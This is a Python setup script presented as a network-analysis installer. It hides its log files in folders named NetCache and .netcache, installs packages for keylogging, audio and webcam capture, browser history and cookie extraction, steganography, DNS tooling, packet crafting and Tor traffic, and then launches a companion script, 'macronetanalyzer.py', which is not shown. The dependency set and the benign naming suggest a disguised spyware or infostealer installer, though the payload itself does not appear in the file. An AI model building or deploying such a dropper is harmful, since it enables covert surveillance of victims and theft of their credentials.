import os
import sys
import subprocess
import platform
import logging
from logging import handlers
from pathlib import Path

# --------------------------- Robust logging ---------------------------
# We log to console + best-effort rotating file.
# On Windows, we prefer %APPDATA%\NetCache and also try %APPDATA%\.netcache.
# If both fail, we fall back to %TEMP%\netsetup_py.log.

def configure_logging():
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    # Always log to console
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
    logger.addHandler(ch)

    candidates = []
    if platform.system() == "Windows":
        base = os.environ.get("APPDATA", str(Path.home()))
        netcache = Path(base) / "NetCache"
        dot_netcache = Path(base) / ".netcache"
        for d in (netcache, dot_netcache):
            try:
                d.mkdir(parents=True, exist_ok=True)
            except Exception:
                pass
            candidates.append(d / "netsetup_py.log")
    else:
        d = Path.home() / ".netcache"
        try:
            d.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass
        candidates.append(d / "netsetup_py.log")

    candidates.append(Path(os.environ.get("TEMP", "/tmp")) / "netsetup_py.log")

    for p in candidates:
        try:
            fh = handlers.RotatingFileHandler(str(p), maxBytes=1_000_000, backupCount=2, delay=True)
            fh.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
            logger.addHandler(fh)
            logger.info("Logging to %s", p)
            return
        except Exception:
            continue

    logger.warning("All file log paths failed; continuing with console-only logging.")

configure_logging()
logging.info("Starting setup process...")

PY = sys.executable  # the exact Python running this script


def _run(cmd, check=True):
    """Run a command and log stdout/stderr."""
    logging.info("EXEC: %s", " ".join(cmd))
    r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    if r.stdout:
        logging.info(r.stdout.strip())
    if check and r.returncode != 0:
        logging.error("Command failed (%s): %s", r.returncode, " ".join(cmd))
        raise subprocess.CalledProcessError(r.returncode, cmd)
    return r.returncode


def ensure_pip():
    """Ensure pip exists and is up to date for this interpreter."""
    try:
        _run([PY, "-m", "pip", "--version"], check=False)
    except Exception:
        pass
    try:
        _run([PY, "-m", "ensurepip", "--upgrade"], check=False)
    except Exception:
        logging.info("ensurepip not available; continuing.")
    _run([PY, "-m", "pip", "install", "--upgrade", "pip", "setuptools", "wheel"], check=False)


def _module_import_name(pkg: str) -> str:
    """Map pip package names to importable module names for presence checks."""
    mapping = {
        "pillow": "PIL",
        "opencv-python": "cv2",
        "opencv-python-headless": "cv2",
        "browser-history": "browser_history",
        "pywin32": "win32api",
        "sounddevice": "sounddevice",
        "wavio": "wavio",
        "psutil": "psutil",
        "keyboard": "keyboard",
        "pynput": "pynput",
        "requests": "requests",
        "stegano": "stegano",
        "dnspython": "dns",
        "scapy": "scapy",
        "browser_cookie3": "browser_cookie3",
        "torpy": "torpy",
    }
    return mapping.get(pkg, pkg.replace("-", "_"))


def _ensure_pkg(pkg: str, required: bool = True) -> bool:
    """Import-check then install a package; return True if present after."""
    mod = _module_import_name(pkg)
    try:
        __import__(mod)
        logging.info("Requirement already satisfied: %s", pkg)
        return True
    except Exception:
        logging.info("Installing %s package: %s", "required" if required else "optional", pkg)
        rc = _run([PY, "-m", "pip", "install", pkg], check=False)
        if rc != 0:
            logging.error("Failed to install %s package: %s", "required" if required else "optional", pkg)
            return False
        try:
            __import__(mod)
            return True
        except Exception:
            logging.error("Installed but still cannot import: %s (%s)", pkg, mod)
            return False


def install_dependencies():
    """Install required & optional packages for this interpreter."""
    required = [
        "keyboard",
        "pynput",
        "requests",
        "pillow",
        "psutil",
        "sounddevice",
        "wavio",
        "opencv-python",   # will fallback to headless if needed
        "browser-history",
        "stegano",
        "dnspython",
    ]
    optional = ["scapy", "browser_cookie3", "torpy"]

    if platform.system() == "Windows":
        required.append("pywin32")

    for pkg in required:
        ok = _ensure_pkg(pkg, required=True)
        if not ok and pkg == "opencv-python":
            logging.info("Attempting fallback: opencv-python-headless")
            _ensure_pkg("opencv-python-headless", required=True)

    for pkg in optional:
        _ensure_pkg(pkg, required=False)


def run_macronetanalyzer():
    """Run macronetanalyzer.py from the same directory as this setup script."""
    target = Path(__file__).resolve().parent / "macronetanalyzer.py"
    if not target.exists():
        logging.error("macronetanalyzer.py not found at: %s", target)
        sys.exit(1)
    rc = _run([PY, str(target)], check=False)
    if rc != 0:
        logging.error("macronetanalyzer exited with code %s", rc)
        sys.exit(rc)


if __name__ == "__main__":
    try:
        ensure_pip()
        install_dependencies()
        logging.info("Dependencies handled; running macronetanalyzer...")
        run_macronetanalyzer()
    except Exception as e:
        logging.exception("Setup failed: %s", e)
        sys.exit(1)
